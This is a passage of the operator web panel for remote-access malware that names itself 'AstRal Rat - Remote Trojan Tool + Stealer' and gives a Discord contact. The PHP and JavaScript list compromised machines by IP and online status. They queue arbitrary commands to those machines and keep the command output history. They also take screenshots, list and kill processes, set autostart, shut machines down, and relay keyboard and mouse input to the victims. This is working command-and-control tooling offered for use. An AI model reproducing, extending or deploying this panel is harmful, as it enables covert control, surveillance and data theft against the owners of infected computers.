    consoleOutput.appendChild(line);
    consoleOutput.scrollTop = consoleOutput.scrollHeight;
}

// Обработка нажатия Enter в поле ввода
document.addEventListener('DOMContentLoaded', function() {
    const cmdInput = document.getElementById('cmdInput');
    if (cmdInput) {
        cmdInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                sendCommandToClient();
            }
        });
    }

    // Загружаем историю при открытии вкладки
    document.getElementById('remote-cmd').addEventListener('click', function() {
        setTimeout(loadCommandHistory, 500);
    });

    // Периодическое обновление истории
    historyRefreshInterval = setInterval(loadCommandHistory, 3000);
});
 // Функция для отображения информации о системе в модальном окне
        function displaySystemInfo(systemInfo) {
            const modal = document.getElementById('systemInfoModal');
            const content = document.getElementById('systemInfoContent');

            // Формируем HTML с информацией о системе
            let html = `
                <div class="system-info-section">
                    <h3><i class="fas fa-desktop"></i> Система</h3>
                    <p>${systemInfo.system}</p>
                </div>

                <div class="system-info-section">
                    <h3><i class="fas fa-microchip"></i> Процессор</h3>
                    <p>${systemInfo.processor}</p>
                </div>

                <div class="system-info-section">
                    <h3><i class="fas fa-memory"></i> Оперативная память</h3>
                    <p>${systemInfo.ram}</p>
                </div>

                <div class="system-info-section">
                    <h3><i class="fas fa-hdd"></i> Дисковое пространство</h3>
                    <p>${systemInfo.disk}</p>
                </div>

                <div class="system-info-section">
                    <h3><i class="fas fa-tv"></i> Видеокарта</h3>
                    <p>${systemInfo.gpu}</p>
                </div>
            `;

            // Добавляем информацию о сетевых интерфейсах
            if (systemInfo.network && Object.keys(systemInfo.network).length > 0) {
                html += `<div class="system-info-section">
                    <h3><i class="fas fa-network-wired"></i> Сетевые интерфейсы</h3>`;

                for (const [interfaceName, ipAddress] of Object.entries(systemInfo.network)) {
                    html += `<p><strong>${interfaceName}:</strong> ${ipAddress}</p>`;
                }

                html += `</div>`;
            }

            content.innerHTML = html;
            modal.style.display = 'block';
        }

        // Функция для закрытия модального окна
        function closeSystemInfoModal() {
            document.getElementById('systemInfoModal').style.display = 'none';
        }

        // Закрытие модального окна при клике вне его области
        window.addEventListener('click', function(event) {
            const modal = document.getElementById('systemInfoModal');
            if (event.target === modal) {
                closeSystemInfoModal();
            }
        });
</script>

 <style>
        .modal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            overflow: auto;
            background-color: rgba(0,0,0,0.7);
        }

        .modal-content {
            background-color: #2c3e50;
            margin: 5% auto;
            padding: 20px;
            border: 1px solid #34495e;
            width: 80%;
            max-width: 800px;
            border-radius: 5px;
            color: #ecf0f1;
            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.5);
        }

        .close {
            color: #aaa;
            float: right;
            font-size: 28px;
            font-weight: bold;
            cursor: pointer;
        }

        .close:hover {
            color: #fff;
        }

        .system-info-section {
            margin-bottom: 20px;
            padding: 15px;
            background-color: #34495e;
            border-radius: 5px;
        }

        .system-info-section h3 {
            margin-top: 0;
            color: #3498db;
            border-bottom: 1px solid #4a6278;
            padding-bottom: 5px;
        }
        </style>

<!-- Вкладка "Диспетчер задач" -->
<div id="taskManager" class="tab-content" style="display:none;">
    <div class="taskmanager-header">
        <h2><i class="fas fa-tasks" aria-hidden="true"></i> Диспетчер задач</h2>
        <div class="header-controls">
            <div class="client-select">
                <select id="taskManagerClientSelect">
                    <?php foreach($data['clients'] as $client_id => $client): ?>
                        <option value="<?php echo htmlspecialchars($client_id); ?>"><?php echo htmlspecialchars($client_id); ?></option>
                    <?php endforeach; ?>
                </select>
            </div>
            <div class="controls-right">
                <button id="toggleTaskManager" class="btn-toggle" onclick="toggleTaskManager()">
                    <i class="fas fa-play"></i> Мониторинг
                </button>
                <button class="btn-refresh" onclick="updateProcessList()">
                    <i class="fas fa-sync"></i>
                </button>
            </div>
        </div>
    </div>

    <div class="taskmanager-content">
        <div class="system-overview">
            <div class="system-info">
                <span id="machineName"><i class="fas fa-desktop"></i> Неизвестно</span>
                <span id="lastUpdate"><i class="fas fa-clock"></i> Никогда</span>
            </div>
            <div class="stats-info">
                <span id="processCount"><i class="fas fa-microchip"></i> 0 процессов</span>
                <span id="memoryUsage"><i class="fas fa-memory"></i> 0 MB</span>
            </div>
        </div>

        <div class="process-list-container">
            <table id="processTable" class="process-table">
                <thead>
                    <tr>
                        <th data-sort="pid">ID <i class="fas fa-sort"></i></th>
                        <th data-sort="name" class="sorted">Имя <i class="fas fa-sort-down"></i></th>
                        <th data-sort="status">Статус <i class="fas fa-sort"></i></th>
                        <th data-sort="memory">Память <i class="fas fa-sort"></i></th>
                        <th data-sort="threads">Потоки <i class="fas fa-sort"></i></th>
                        <th>Действия</th>
                    </tr>
                </thead>
                <tbody id="processList">
                    <tr>
                        <td colspan="6" class="no-processes">Нет данных о процессах</td>
                    </tr>
                </tbody>
            </table>
        </div>
    </div>
</div>
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', system-ui, sans-serif;
    }

    body {
        background-color: #121212;
        color: #e0e0e0;
        padding: 16px;
        line-height: 1.4;
    }

    .taskmanager-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        padding-bottom: 15px;
        border-bottom: 1px solid #1e1e1e;
        border-radius: 12px 12px 0 0;
    }

    .taskmanager-header h2 {
        margin: 0;
        font-weight: 500;
        font-size: 1.4rem;
        color: #e0e0e0;
    }

    .header-controls {
        display: flex;
        align-items: center;
        gap: 12px;
    }

    .client-select select {
        padding: 8px 16px;
        border: 1px solid #2a2a2a;
        border-radius: 12px;
        background: #1e1e1e;
        color: #e0e0e0;
        font-size: 13px;
        min-width: 160px;
        outline: none;
        transition: all 0.2s ease;
        cursor: pointer;
    }

    .client-select select:hover {
        border-color: #3a3a3a;
        background: #252525;
    }

    .controls-right {
        display: flex;
        gap: 8px;
    }

    .btn-toggle, .btn-refresh {
        background: #1e1e1e;
        border: 1px solid #2a2a2a;
        border-radius: 12px;
        color: #e0e0e0;
        padding: 8px 16px;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 6px;
        font-size: 13px;
        transition: all 0.2s ease;
    }

    .btn-refresh {
        padding: 8px;
        width: 40px;
        justify-content: center;
        border-radius: 50%;
    }

    .btn-toggle:hover, .btn-refresh:hover {
        background: #2a2a2a;
        transform: translateY(-1px);
        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .btn-toggle.active {
        background: #2d2d2d;
        border-color: #3a3a3a;
        box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.2);
    }

    .system-overview {
        display: flex;
        justify-content: space-between;
        padding: 16px 20px;
        background: #1e1e1e;
        border-radius: 12px;
        font-size: 13px;
        margin-bottom: 16px;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .system-info, .stats-info {
        display: flex;
        gap: 24px;
    }

    .system-info span, .stats-info span {
        display: flex;
        align-items: center;
        gap: 6px;
        color: #a0a0a0;
    }

    .process-list-container {
        overflow-x: auto;
        border-radius: 12px;
        background: #1e1e1e;
        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
    }

    .process-table {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
        font-size: 13px;
        border-radius: 12px;
        overflow: hidden;
    }

    .process-table th {
        background: #252525;
        padding: 14px 16px;
        text-align: left;
        font-weight: 500;
        color: #e0e0e0;
        border-bottom: 1px solid #2a2a2a;
        cursor: pointer;
        user-select: none;
        position: relative;
        transition: all 0.2s ease;
    }

    .process-table th:first-child {
        border-top-left-radius: 12px;
    }

    .process-table th:last-child {
        border-top-right-radius: 12px;
    }

    .process-table th:hover {
        background: #2d2d2d;
    }

    .process-table td {
        padding: 14px 16px;
        border-bottom: 1px solid #2a2a2a;
        color: #d0d0d0;
        transition: all 0.2s ease;
    }

    .process-table tr:last-child td {
        border-bottom: none;
    }

    .process-table tr:last-child td:first-child {
        border-bottom-left-radius: 12px;
    }

    .process-table tr:last-child td:last-child {
        border-bottom-right-radius: 12px;
    }

    .process-table tr:hover td {
        background: #252525;
        transform: scale(1.01);
    }

    .status-cell {
        display: flex;
        align-items: center;
        gap: 6px;
    }

    .status-badge {
        padding: 4px 10px;
        font-size: 11px;
        font-weight: 500;
        border-radius: 10px;
        background: rgba(255, 255, 255, 0.1);
    }

    .status-running {
        color: #4caf50;
        background: rgba(76, 175, 80, 0.1);
    }

    .status-sleeping {
        color: #2196f3;
        background: rgba(33, 150, 243, 0.1);
    }

    .status-stopped {
        color: #f44336;
        background: rgba(244, 67, 54, 0.1);
    }

    .status-zombie {
        color: #ff9800;
        background: rgba(255, 152, 0, 0.1);
    }

    .status-other {
        color: #9e9e9e;
        background: rgba(158, 158, 158, 0.1);
    }

    .btn-kill {
        background: transparent;
        color: #f44336;
        border: 1px solid #f44336;
        border-radius: 8px;
        padding: 6px 12px;
        cursor: pointer;
        transition: all 0.2s ease;
        font-size: 11px;
    }

    .btn-kill:hover {
        background: #f44336;
        color: #fff;
        transform: translateY(-1px);
        box-shadow: 0 4px 8px rgba(244, 67, 54, 0.3);
    }

    .no-processes {
        text-align: center;
        color: #9e9e9e;
        font-style: italic;
        padding: 40px;
        border-radius: 12px;
    }

    @media (max-width: 768px) {
        .taskmanager-header {
            flex-direction: column;
            align-items: flex-start;
            gap: 12px;
        }

        .header-controls {
            width: 100%;
            justify-content: space-between;
        }

        .system-overview {
            flex-direction: column;
            gap: 12px;
        }

        .system-info, .stats-info {
            flex-wrap: wrap;
            gap: 12px;
        }

        .process-table th,
        .process-table td {
            padding: 12px 14px;
        }

        .btn-toggle, .btn-refresh {
            padding: 8px 12px;
        }
    }
</style>
<div id="info" class="tab-content" style="display:none;">
    <div class="history-header">
        <h2><i class="fas fa-info-circle"></i> Информация о проекте</h2>
    </div>

    <div class="info-section">
        <div class="history-item">
            <h3><i class="fas fa-project-diagram"></i> О проекте</h3>
            <p>AstRal Rat - Remote Trojan Tool + Stealer</p>
        </div>


        <div class="history-item">
            <h3><i class="fas fa-link"></i> API Endpoints</h3>
            <p><strong>API URL:</strong> <?= "http://".$_SERVER['HTTP_HOST'] ?>/api.php</p>
        </div>

        <div class="history-item" style="border-bottom: none;">
            <a href="https://discord.gg/rPDv2NKNpX" target="_blank" class="article-button">
                <i class="fas fa-external-link-alt"></i> Discord Team
            </a>
        </div>
    </div>
</div>

<style>
.info-section {
    padding: 15px;
    background: #1e1e1e;
    margin-top: 10px;
    border-radius: 8px;
}

.history-item {
    padding: 15px;
    margin: 10px 0;
    background: #252525;
    border-radius: 6px;
    border: 1px solid #333;
}

.history-item h3 {
    margin: 0 0 10px 0;
    font-size: 16px;
}

.article-button {
    display: block;
    padding: 12px;
    background: #1a1a1a;
    color: white!important;
    text-align: center;
    border-radius: 6px;
    text-decoration: none;
    transition: background 0.3s;
}

.article-button:hover {
    background: #2a2e35;
}

.history-item p {
    margin: 8px 0;
    font-size: 14px;
}
</style>

<!-- Вкладка "Управление клиентами" -->
<div id="manage" class="tab-content">
    <?php if(empty($data['clients'])): ?>
        <p>Нет подключённых клиентов.</p>
    <?php else: ?>
        <div class="client-grid">
            <?php foreach($data['clients'] as $client_id => $client): ?>
                <!-- Карточка клиента (та же разметка, но без onclick) -->
                <div class="client-card">
                    <div class="client-header">
                        <div class="client-title">
                            <h3>
                                <i class="fas fa-desktop"></i>
                                <?php echo htmlspecialchars($client_id); ?>
                            </h3>
                        </div>

                        <div class="quick-actions">
                            <button class="btn-icon delete-btn" title="Удалить">
                                <i class="fas fa-trash"></i>
                            </button>
                            <button class="btn-icon" title="Данные">
                                <i class="fas fa-database"></i>
                            </button>
                            <button class="btn-icon" title="Автостарт">
                                <i class="fas fa-play-circle fa-2x text-info"></i>
                            </button>
                            <button class="btn-icon" title="Выключить">
                                <i class="fas fa-power-off"></i>
                            </button>
                        </div>
                    </div>

                    <div class="client-info-grid">
                        <div class="info-label" style="font-size:13px; color:#fff;">
                            <div style="display: flex; align-items: center;">
                                <span style="color: #acaeb1;">Описание</span>
                                <button class="edit-description-btn" style="margin-left: 2px; background: none; border: none; cursor: pointer;">
                                    <i class="fa-solid fa-circle-plus" style="color: #acaeb1; font-size: 11px;"></i>
                                </button>
                            </div>
                            <div id="description-<?php echo $client_id; ?>" style="font-weight: normal;">
                                <?php
                                $descriptions = json_decode(file_get_contents('descriptions.json'), true) ?? [];
                                echo htmlspecialchars($descriptions[$client_id] ?? 'Компьютер домашний');
                                ?>
                            </div>
                        </div>

                        <div class="info-item">
                            <div class="info-label">Активность</div>
                            <?php echo date("H:i", $client['last_seen']); ?>
                        </div>
                        <div class="info-item">
                            <div class="info-label">IP адрес</div>
                            <div class="info-label"><?php echo htmlspecialchars($client['ip']); ?></div>
                        </div>
                        <div class="info-item">
                            <div class="info-label">Статус</div>
                            <?php echo (time() - $client['last_seen'] > 60) ? 'Offline' : 'Online'; ?>
                        </div>
                    </div>

                    <div class="actions-toolbar">
                        <form class="command-input" method="post" action="api.php">
                            <input type="hidden" name="action" value="set_command">
                            <input type="hidden" name="client_id" value="<?php echo $client_id; ?>">
                            <div class="command-input-group">
                                <input type="text"
                                       name="command"
                                       placeholder="Введите команду"
                                       autocomplete="off">
                                <button type="submit">
                                    <i class="fas fa-paper-plane"></i>
                                </button>
                            </div>
                        </form>

                        <div class="utility-buttons">
                            <button class="btn-icon" title="Скриншот">
                                <i class="fas fa-camera"></i>
                            </button>
                            <?php if (!empty($client['screenshot'])): ?>
                                <button class="btn-icon" onclick="openModal('<?php echo $client['screenshot']; ?>')" title="Просмотр">
                                    <i class="fas fa-image"></i>
                                </button>
                            <?php endif; ?>
                        </div>
                    </div>
                </div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>
</div>

<script>
// Очередь команд
let commandQueue = [];
let isProcessingQueue = false;
let isKeyboardCaptured = false;

// Функция для отправки команд управления
function sendControlCommand(clientId, command) {
    // Добавляем команду в очередь
    commandQueue.push({ clientId, command });

    // Запускаем обработку очереди, если она еще не запущена
    if (!isProcessingQueue) {
        processQueue();
    }
}

// Функция для обработки очереди команд
function processQueue() {
    isProcessingQueue = true;

    if (commandQueue.length === 0) {
        isProcessingQueue = false;
        return;
    }

    const { clientId, command } = commandQueue.shift();

    const formData = new FormData();
    formData.append('action', 'set_command');
    formData.append('client_id', clientId);
    formData.append('command', command);

    fetch('api.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.json())
    .then(data => {
        if (data.status !== 'ok') {
            console.error('Ошибка отправки команды:', data);
        }

        // Обрабатываем следующую команду после небольшой задержки
        setTimeout(processQueue, 10);
    })
    .catch(error => {
        console.error('Ошибка:', error);
        setTimeout(processQueue, 10);
    });
}

// Функция для включения/выключения захвата клавиатуры
function toggleKeyboardCapture() {
    isKeyboardCaptured = !isKeyboardCaptured;
    const captureBtn = document.getElementById('keyboardCaptureBtn');
    const stopBtn = document.getElementById('keyboardStopBtn');

    if (isKeyboardCaptured) {
        captureBtn.style.display = 'none';
        stopBtn.style.display = 'inline-block';
        document.getElementById('keyboardStatus').textContent = 'Захват включен - печатайте на своей клавиатуре';
        document.addEventListener('keydown', handleKeyDown);
        document.addEventListener('keyup', handleKeyUp);
    } else {
        captureBtn.style.display = 'inline-block';
        stopBtn.style.display = 'none';
        document.getElementById('keyboardStatus').textContent = 'Захват отключен';
        document.removeEventListener('keydown', handleKeyDown);
        document.removeEventListener('keyup', handleKeyUp);

        // Сбрасываем все нажатые клавиши
        document.querySelectorAll('.key.pressed').forEach(key => {
            key.classList.remove('pressed');
        });
    }
}

// Обработчик нажатия клавиш
function handleKeyDown(e) {
    if (!isKeyboardCaptured) return;

    e.preventDefault();

    const clientId = document.getElementById('controlClientSelect').value;
    let key = e.key.toLowerCase();

    // Преобразуем специальные клавиши
    const keyMap = {
        'backspace': 'backspace',
        'tab': 'tab',
        'enter': 'enter',
        'capslock': 'capslock',
        'shift': 'shift',
        'control': 'ctrl',
        'alt': 'alt',
        ' ': 'space',
        'arrowleft': 'left',
        'arrowright': 'right',
        'arrowup': 'up',
        'arrowdown': 'down',
        'escape': 'esc',
        'meta': 'win'
    };

    const keyToSend = keyMap[key] || key;

    // Отправляем команду
    sendControlCommand(clientId, `key:${keyToSend}`);

    // Находим соответствующую виртуальную клавишу и добавляем анимацию
    const virtualKey = findVirtualKey(keyToSend);
    if (virtualKey && !virtualKey.classList.contains('pressed')) {
        virtualKey.classList.add('pressed');
    }
}

// Обработчик отпускания клавиш
function handleKeyUp(e) {
    if (!isKeyboardCaptured) return;

    let key = e.key.toLowerCase();

    // Преобразуем специальные клавиши
    const keyMap = {
        'backspace': 'backspace',
        'tab': 'tab',
        'enter': 'enter',
        'capslock': 'capslock',
        'shift': 'shift',
        'control': 'ctrl',
        'alt': 'alt',
        ' ': 'space',
        'arrowleft': 'left',
        'arrowright': 'right',
        'arrowup': 'up',
        'arrowdown': 'down',
        'escape': 'esc',
        'meta': 'win'
    };

    const keyToSend = keyMap[key] || key;

    // Находим соответствующую виртуальную клавишу и убираем анимацию
    const virtualKey = findVirtualKey(keyToSend);
    if (virtualKey) {
        virtualKey.classList.remove('pressed');
    }
}

// Функция для поиска виртуальной клавиши по значению
function findVirtualKey(keyValue) {
    // Прямой поиск по data-key
    let keyElement = document.querySelector(`.key[data-key="${keyValue}"]`);

    if (!keyElement) {
        // Для специальных клавиш может потребоваться дополнительное сопоставление
        const specialKeysMap = {
            'ctrl': 'control',
            'alt': 'alt',
            'win': 'meta',
            'left': 'arrowleft',
            'right': 'arrowright',
            'up': 'arrowup',
            'down': 'arrowdown',
            'esc': 'escape'
        };

        const mappedKey = specialKeysMap[keyValue];
        if (mappedKey) {
            keyElement = document.querySelector(`.key[data-key="${mappedKey}"]`);
        }
    }

    return keyElement;
}

// Инициализация после загрузки DOM
document.addEventListener('DOMContentLoaded', function() {
    // Добавляем кнопки управления захватом
    const keyboardSection = document.querySelector('.keyboard-section');
    const controlsDiv = document.createElement('div');
    controlsDiv.className = 'keyboard-controls';
    controlsDiv.innerHTML = `
        <div style="margin: 10px 0; display: flex; align-items: center; gap: 10px;">
            <button id="keyboardCaptureBtn" class="capture-btn">Захватить клавиатуру</button>
            <button id="keyboardStopBtn" class="stop-btn" style="display: none;">Остановить захват</button>
            <span id="keyboardStatus" style="color: #888;">Захват отключен</span>
        </div>
    `;
    keyboardSection.insertBefore(controlsDiv, keyboardSection.querySelector('.keyboard'));

    // Назначаем обработчики для кнопок захвата
    document.getElementById('keyboardCaptureBtn').addEventListener('click', toggleKeyboardCapture);
    document.getElementById('keyboardStopBtn').addEventListener('click', toggleKeyboardCapture);

    // Обработчики для виртуальных клавиш клавиатуры
    document.querySelectorAll('.key').forEach(key => {
        key.addEventListener('mousedown', function() {
            if (isKeyboardCaptured) return; // Не обрабатываем, если захват активен

            const clientId = document.getElementById('controlClientSelect').value;
            const keyValue = this.getAttribute('data-key');

            // Добавляем визуальную обратную связь
            this.classList.add('pressed');

            // Формируем команду для клавиши
            let command = '';

            // Обработка специальных клавиш
            switch(keyValue) {
                case 'backspace':
                    command = 'key:backspace';
                    break;
                case 'tab':
                    command = 'key:tab';
                    break;
                case 'enter':
                    command = 'key:enter';
                    break;
                case 'capslock':
                    command = 'key:capslock';
                    break;
                case 'shift':
                case 'rshift':
                    command = 'key:shift';
                    break;
                case ' ':
                    command = 'key:space';
                    break;
                default:
                    command = `key:${keyValue}`;
            }

            sendControlCommand(clientId, command);
        });

        key.addEventListener('mouseup', function() {
            if (isKeyboardCaptured) return;
            this.classList.remove('pressed');
        });

        key.addEventListener('mouseleave', function() {
            if (isKeyboardCaptured) return;
            this.classList.remove('pressed');
        });
    });

    // Обработчики для кнопок мыши
    document.querySelectorAll('.mouse-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            const clientId = document.getElementById('controlClientSelect').value;
            const button = this.getAttribute('data-button');
            sendControlCommand(clientId, `mouse:${button}`);
        });
    });

    // Инициализация джойстика для управления мышью
    const joystick = document.getElementById('joystick');
    const joystickHead = joystick.querySelector('.joystick-head');
    let isJoystickActive = false;
    let joystickInterval = null;

    // Функция для расчета смещения курсора
    function calculateMove(e) {
        const rect = joystick.getBoundingClientRect();
        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;

        const deltaX = e.clientX - centerX;
        const deltaY = e.clientY - centerY;

        // Ограничиваем движение в пределах джойстика
        const distance = Math.min(Math.sqrt(deltaX * deltaX + deltaY * deltaY), rect.width / 2);
        const angle = Math.atan2(deltaY, deltaX);

        const limitedX = Math.cos(angle) * distance;
        const limitedY = Math.sin(angle) * distance;

        // Перемещаем головку джойстика
        joystickHead.style.transform = `translate(${limitedX}px, ${limitedY}px)`;

        // Возвращаем нормализованные значения (-1 до 1)
        return {
            x: limitedX / (rect.width / 2),
            y: limitedY / (rect.height / 2)
        };
    }

    // Обработчики событий для джойстика
    joystick.addEventListener('mousedown', function(e) {
        isJoystickActive = true;
        calculateMove(e); // начальная позиция

        // Запускаем интервал для отправки команд движения
        joystickInterval = setInterval(() => {
            const clientId = document.getElementById('controlClientSelect').value;
            const move = calculateMove(e);

            // Отправляем команду движения мыши
            // Масштабируем значения для более плавного движения
            const speed = 10;
            const moveX = Math.round(move.x * speed);
            const moveY = Math.round(move.y * speed);

            if (moveX !== 0 || moveY !== 0) {
                sendControlCommand(clientId, `mouse_move:${moveX},${moveY}`);
            }
        }, 100); // Отправляем команды каждые 100мс
    });

    // Отпускание джойстика
    document.addEventListener('mouseup', function() {
        if (isJoystickActive) {
            isJoystickActive = false;
            clearInterval(joystickInterval);
            joystickHead.style.transform = 'translate(0, 0)';
        }
    });

    // Отслеживание движения мыши при активном джойстике
    document.addEventListener('mousemove', function(e) {
        if (isJoystickActive) {
            calculateMove(e);
        }
    });
});
</script>
<!-- Вкладка "История вывода" -->
<div id="history" class="tab-content" style="display:none;">
    <div class="history-header">
        <h2><i class="fas fa-history"></i> История вывода</h2>
        <button class="btn-danger" onclick="clearHistory()" title="Очистить всю историю">
            <i class="fas fa-trash-alt"></i> Удалить историю
        </button>
    </div>
    <div id="historyContent">
        <?php
        $historyFile = 'output_history.json';
        if(file_exists($historyFile)) {
            $historyData = json_decode(file_get_contents($historyFile), true);
            if(!empty($historyData)) {
                $historyData = array_reverse($historyData);
                foreach($historyData as $entry) {
                    echo '<div class="history-entry">';
                    echo '<p><strong>Время:</strong> ' . date("Y-m-d H:i:s", $entry['timestamp']) . '</p>';
                    echo '<p><strong>Клиент:</strong> ' . htmlspecialchars($entry['client_id']) . '</p>';
                    echo '<p><strong>Вывод:</strong><br>' . nl2br(htmlspecialchars($entry['output'])) . '</p>';
                    echo '</div>';
                }
            } else {
                echo '<p>История пуста.</p>';
            }
        } else {
            echo '<p>История пуста.</p>';
        }
        ?>
    </div>
</div>

<style>
/* Стили для кнопок захвата */
.capture-btn {
    background-color: rgba(0, 0, 0, 0);
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    font-weight: bold;
}

.stop-btn {
    background-color:rgba(0, 0, 0, 0);
    color: white;
    border: none;
    padding: 8px 16px;
    border-radius: 4px;
    cursor: pointer;
    font-weight: bold;
}

.capture-btn:hover {
    background-color: rgba(0, 0, 0, 0.3);
}

.stop-btn:hover {
    background-color: rgba(0, 0, 0, 0.3);
}

/* Анимация нажатия клавиш */
.key.pressed {
    background-color: #ffcc00 !important;
    transform: translateY(2px);
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
    transition: all 0.1s ease;
}

/* Стили для виртуальной клавиатуры */
.key {
    transition: all 0.1s ease;
}
</style>

<!-- Вкладка "Управление" -->
<div id="control" class="tab-content" style="display:none;">
    <h2><i class="fas fa-gamepad"></i> Управление клиентом</h2>

    <div class="control-panel">
        <!-- Выбор клиента -->
        <div class="client-select">
            <select id="controlClientSelect">
                <?php foreach($data['clients'] as $client_id => $client): ?>
                    <option value="<?php echo htmlspecialchars($client_id); ?>">
                        <?php echo htmlspecialchars($client_id); ?>
                    </option>
                <?php endforeach; ?>
            </select>
        </div>

        <!-- Виртуальная клавиатура -->
        <div class="keyboard-section">
            <h3><i class="fas fa-keyboard"></i> Клавиатура</h3>
            <div class="keyboard">
                <!-- Первый ряд -->
                <div class="keyboard-row">
                    <button class="key" data-key="`">` ~</button>
                    <button class="key" data-key="1">1 !</button>
                    <button class="key" data-key="2">2 @</button>
                    <button class="key" data-key="3">3 #</button>
                    <button class="key" data-key="4">4 $</button>
                    <button class="key" data-key="5">5 %</button>
                    <button class="key" data-key="6">6 ^</button>
                    <button class="key" data-key="7">7 &</button>
                    <button class="key" data-key="8">8 *</button>
                    <button class="key" data-key="9">9 (</button>
                    <button class="key" data-key="0">0 )</button>
                    <button class="key" data-key="-">- _</button>
                    <button class="key" data-key="=">= +</button>
                    <button class="key key-wide" data-key="backspace">Backspace</button>
                </div>

                <!-- Второй ряд -->
                <div class="keyboard-row">
                    <button class="key key-wide" data-key="tab">Tab</button>
                    <button class="key" data-key="q">Q</button>
                    <button class="key" data-key="w">W</button>
                    <button class="key" data-key="e">E</button>
                    <button class="key" data-key="r">R</button>
                    <button class="key" data-key="t">T</button>
                    <button class="key" data-key="y">Y</button>
                    <button class="key" data-key="u">U</button>
                    <button class="key" data-key="i">I</button>
                    <button class="key" data-key="o">O</button>
                    <button class="key" data-key="p">P</button>
                    <button class="key" data-key="[">[ {</button>
                    <button class="key" data-key="]">] }</button>
                    <button class="key" data-key="\\">\\ |</button>
                </div>

                <!-- Третий ряд -->
                <div class="keyboard-row">
                    <button class="key key-caps" data-key="capslock">Caps</button>
                    <button class="key" data-key="a">A</button>
                    <button class="key" data-key="s">S</button>
                    <button class="key" data-key="d">D</button>
                    <button class="key" data-key="f">F</button>
                    <button class="key" data-key="g">G</button>
                    <button class="key" data-key="h">H</button>
                    <button class="key" data-key="j">J</button>
                    <button class="key" data-key="k">K</button>
                    <button class="key" data-key="l">L</button>
                    <button class="key" data-key=";">; :</button>
                    <button class="key" data-key="'">' "</button>
                    <button class="key key-wide" data-key="enter">Enter</button>
                </div>

                <!-- Четвертый ряд -->
                <div class="keyboard-row">
                    <button class="key key-shift" data-key="shift">Shift</button>
                    <button class="key" data-key="win">Win</button>
                    <button class="key" data-key="z">Z</button>
                    <button class="key" data-key="x">X</button>
                    <button class="key" data-key="c">C</button>
                    <button class="key" data-key="v">V</button>
                    <button class="key" data-key="b">B</button>
                    <button class="key" data-key="n">N</button>
                    <button class="key" data-key="m">M</button>
                    <button class="key" data-key=",">, <</button>
                    <button class="key" data-key=".">. ></button>
                    <button class="key" data-key="/">/ ?</button>

                </div>

                <!-- Пятый ряд -->
                <div class="keyboard-row">
                    <button class="key key-space" data-key=" ">Space</button>
                </div>
            </div>
        </div>

        <!-- Управление мышью -->
        <div class="mouse-section">
            <h3><i class="fas fa-mouse"></i> Мышь</h3>
            <div class="mouse-control">
                <!-- Джойстик для управления -->
                <div class="joystick-container">
                    <div class="joystick" id="joystick">
                        <div class="joystick-head"></div>
                    </div>
                </div>

                <!-- Кнопки мыши -->
                <div class="mouse-buttons">
                    <button class="mouse-btn left-click" data-button="left">
                        <i class="fas fa-hand-point-left"></i> ЛКМ
                    </button>
                    <button class="mouse-btn right-click" data-button="right">
                        <i class="fas fa-hand-point-right"></i> ПКМ
                    </button>
                    <button class="mouse-btn middle-click" data-button="middle">
                        <i class="fas fa-hand-pointer"></i> Колесо
                    </button>
                </div>
            </div>
        </div>
    </div>
</div>
<style>
/* Стили для вкладки управления */
.control-panel {
    padding: 20px;
    background-color: #121212;
    border-radius: 10px;
    margin-top: 15px;
}

.client-select {
    margin-bottom: 20px;
}

.client-select select {
    background-color: #1a1a1a;
    color: #fff;
    border: 1px solid #333;
    padding: 8px 15px;
    border-radius: 5px;
    width: 200px;
}

.keyboard-section, .mouse-section {
    margin-bottom: 30px;
    background-color: #1a1a1a;
    padding: 15px;
    border-radius: 8px;
}

.keyboard-section h3, .mouse-section h3 {
    margin-top: 0;
    margin-bottom: 15px;
    color: #e0e0e0;
    display: flex;
    align-items: center;
    gap: 10px;
}

.keyboard {
    display: flex;
    flex-direction: column;
    gap: 6px;
    background-color: #2a2a2a;
    padding: 15px;
    border-radius: 8px;
}

.keyboard-row {
    display: flex;
    justify-content: center;
    gap: 6px;
}

.key {
    background-color: #333;
    color: #fff;
    border: none;
    border-radius: 4px;
    padding: 10px;
    min-width: 40px;
    height: 40px;
    cursor: pointer;
    transition: all 0.2s;
    box-shadow: 0 2px 4px rgba(0,0,0,0.3);
}

.key:hover {
    transform: translateY(-2px);
}

.key:active {
    transform: translateY(0);
}

.key-wide {
    min-width: 80px;
}

.key-caps, .key-shift {
    min-width: 90px;
}

.key-space {
    min-width: 300px;
}

/* Стили для управления мышью */
.mouse-control {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 20px;
}

.joystick-container {
    width: 150px;
    height: 150px;
    background-color: #2a2a2a;
    border-radius: 50%;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
}

.joystick {
    width: 100px;
    height: 100px;
    background-color: #333;
    border-radius: 50%;
    position: relative;
    cursor: pointer;
}

.joystick-head {
    width: 40px;
    height: 40px;
    background-color: #555;
    border-radius: 50%;
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    transition: transform 0.1s;
}

.mouse-buttons {
    display: flex;
    gap: 15px;
}

.mouse-btn {
    background-color: #333;
    color: #fff;
    border: none;
    border-radius: 6px;
    padding: 10px 15px;
    cursor: pointer;
    transition: all 0.2s;
}

.mouse-btn:hover {
    background-color: #444;
}

.mouse-btn:active {
    background-color: #555;
}

.left-click:hover {
    background-color: #3a5c84;
}

.right-click:hover {
    background-color: #843a3a;
}

.middle-click:hover {
    background-color: #3a8468;
}
</style>

<script>
